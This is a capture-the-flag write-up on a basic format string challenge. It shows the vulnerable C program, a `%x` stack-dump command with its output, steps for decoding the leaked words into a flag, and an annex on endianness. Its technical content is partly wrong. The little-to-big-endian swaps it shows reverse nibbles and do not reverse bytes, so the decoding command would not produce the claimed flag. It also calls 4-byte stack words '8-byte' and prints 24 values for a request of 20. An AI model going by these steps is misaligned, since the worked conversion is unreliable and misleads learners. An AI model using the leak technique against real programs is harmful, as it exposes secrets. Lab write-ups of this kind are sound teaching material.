# Basic Format String

#### Challenge Overview

The challenge is to exploit a **format string vulnerability** in the following C program:

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]){
	FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
	char buffer[32];
	fgets(buffer, sizeof(buffer), secret);
	printf(argv[1]);
	fclose(secret);
	return 0;
}
```

The vulnerability lies in the `printf(argv[1]);` line, where the input argument is used as a format string without validation. This allows us to leak memory content from the stack.

***

#### Exploitation Process

**Step 1: Dump the Stack with `%x`**

To inspect the stack, we use the following command:

`./ch5 "$(python3 -c 'print("%x " * 20)')"`

This command prints 20 8-byte hexadecimal values from the stack in **little-endian format**. The result of the command is:

`00000020 0804b008 b7e562f3 00000000 08049ff4 00000002 bffffbc4 bffffce2 0000002f 0804b008 39617044 28293664 6d617045 00000a64 b7e564ad b7fd03c4 b7fff000 08048579 9fe96a00 08048570 00000000 00000000 b7e3caf3 00000002`

***

**Step 2: Identify Potential ASCII Values**

From the stack dump, we identify suspicious hexadecimal values:

`39617044 28293664 6d617045 00000a64`

These likely contain ASCII data, as they fall within the range of printable characters.

***

**Step 3: Convert Hexadecimal to ASCII**

Since the stack values are stored in **little-endian format**, we first swap the 4-byte segments to **big-endian format** for proper interpretation:

```bash
39617044 -> 44071693 
28293664-> 64362928 
6d617045 -> 4570616d 
00000a64 -> 640a0000
```

Next, we convert these big-endian values to ASCII using a hexadecimal-to-ASCII converter. For example:

```bash
echo -n "44071693 64362928 4570616d 640a0000" | xxd -r -p
```

This yields the **password or flag**.

#### Key Takeaways

* **Little-Endian to Big-Endian Conversion**: Stack data is stored in little-endian format. Reordering the bytes is critical before decoding.
* **Hexadecimal to ASCII**: Use tools like `xxd` or Python for efficient conversion.

#### Final Notes

You successfully leveraged the format string vulnerability to dump stack memory and identified the flag. This process demonstrates the power of **format string exploits** for memory leakage in binary exploitation.

#### Annexe: Endianness (Little Endian vs. Big Endian)

**Endianness** refers to the order in which bytes are arranged in memory to represent data. There are two main types: **Little Endian** and **Big Endian**.

#### 1. **Little Endian**

In **Little Endian**, the least significant byte (LSB) is stored first, at the lowest memory address.

**Example:**

Consider the hexadecimal value `0x12345678` stored in memory. In **Little Endian**, it will be arranged as:

```yaml
Memory Address: 0x00 0x01 0x02 0x03 
Value: 0x78 0x56 0x34 0x12
```

* **LSB (0x78)** comes first.
* This format is commonly used by **x86 and x86-64 architectures**.

**Advantages:**

* **Hardware efficiency**: Little Endian allows the least significant byte to be accessed directly, which can be useful in certain low-level operations.

#### 2. **Big Endian**

In **Big Endian**, the most significant byte (MSB) is stored first, at the lowest memory address.

**Example:**

For the same value `0x12345678`, in **Big Endian**, it will be stored as:

```yaml
Memory Address: 0x00 0x01 0x02 0x03 
Value: 0x12 0x34 0x56 0x78
```

* **MSB (0x12)** comes first.
* This format is used by **network protocols** (e.g., IP headers), some RISC architectures, and older systems like Motorola processors.

#### 3. **Converting Between Endian Formats**

To convert from Little Endian to Big Endian:

1. Split the hexadecimal number into 4-byte chunks.
2. Reverse the order of the bytes within each chunk.
